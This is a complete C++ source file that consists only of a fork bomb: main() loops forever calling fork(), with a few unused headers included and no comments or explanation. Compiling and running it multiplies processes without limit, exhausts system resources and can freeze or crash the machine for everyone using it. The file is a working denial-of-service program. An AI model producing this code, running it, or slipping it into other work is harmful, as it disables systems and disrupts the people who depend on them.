#include <iostream>
#include <cstdlib>
#include <sstream>
#include <unistd.h>


int main () {
    while (1) {
        fork();
    }
}